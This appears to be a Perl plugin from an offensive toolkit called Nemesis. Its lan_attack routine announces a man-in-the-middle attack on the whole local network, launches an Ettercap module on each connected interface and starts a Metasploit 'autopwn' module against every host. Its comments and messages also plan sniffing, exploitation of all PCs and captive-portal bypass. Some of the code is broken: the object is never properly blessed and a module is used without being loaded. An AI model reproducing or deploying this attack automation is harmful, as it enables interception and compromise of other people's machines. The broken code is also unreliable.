package Plugin::LAN;
use warnings;

#require Nemesis::Plugin::Ettercap;

sub new {
    my $package = shift;
    bless( {}, $package );
    my (%config) = @_;
    %{ $package->{'CONFIG'} } = %config;
    die("IO and interface must be defined\n")
        if ( !defined( $package->{'CONFIG'}->{'IO'} )
        || !defined( $package->{'CONFIG'}->{'interfaces'} )
        || !defined( $package->{'CONFIG'}->{'env'} ) );
    $package->{'CONFIG'}->{'IO'}->debug("Nemesis::LAN loaded");

    return $package;
}

sub clear() {
    return 1;
}

sub lan_attack() {
    my $self = shift;
    $self->{'CONFIG'}->{'IO'}->verbose(1);    ##only for now##
    my $IO = $self->{'CONFIG'}->{'IO'};
    $IO->print_info("Lan attack");
    my $interfaces = $self->{'CONFIG'}->{'interfaces'};
    my $env        = $self->{'CONFIG'}->{'env'};
    $interfaces->print_devices();
    $IO->print_info("Checking connection");

    my ( $conn, $internet ) = $interfaces->connected();
    my @output;
    if ( $conn == 1 ) {

        #QUI INVECE SNIFFING, MITM, ATTACCO A TUTTI I PC DELLA RETE.
        $IO->print_info(
            "We found a lan connection, good!\n\t\t\tThis is what i'll do for you:\n\t\t\t\t\* Mitm attack to all the network \n\t\t\t\t\* Autopwn all the network \n\t\t\t\t\* Scanning the network for exploitable webservers."
        );
        my $etter = new Nemesis::Plugin::Ettercap(
            IO        => $IO,
            interface => $interfaces,
            env       => $env
        );
        my @devices = $interfaces->connected_devices();
        foreach my $dev (@devices) {
            $IO->debug("checking $dev");
            if ( $self->{'CONFIG'}->{'interfaces'}->{'devices'}->{$dev}
                ->{'IPV4_ADDRESS'} ne "" )
            {
                $IO->debug("Launching ettercap plugin on $dev");
                $etter->start($dev);

            }
        }
        my $metasploit = new Nemesis::Plugin::Metasploit( $IO, $env );
        $metasploit->start();

    }
    if ( $internet == 1 ) {
        $IO->print_info("We found a internet connection, very good!");
        $IO->print_info(
            "This is what i'll do for you\n\t\* Mitm attack to all the network \n\t\t\t\t\* Autopwn all the network \n\t\t\t\t\* Scanning the network for exploitable webservers."
        );

        #QUI BISOGNA SNIFFARE E METASPLOITARE TUTTI I PC DELLA RETE

    }
    else {

        $IO->print_info(
            "No internet connection found, so this is what i'll do for you:\n\t\t\t\t\* Acquiring a WIFI connection if avaible (bypassing also captive portal)\n\t\t\t\t\* Try to gain internet if there is a host in lan that is a gateway."
        );

    }

    #my $proc        = new Nemesis::Process;
    #my @res = $proc->find("virtuoso");
    #foreach my $re(@res){
    #	$IO->debug($re);
    #}

}
1;
__END__
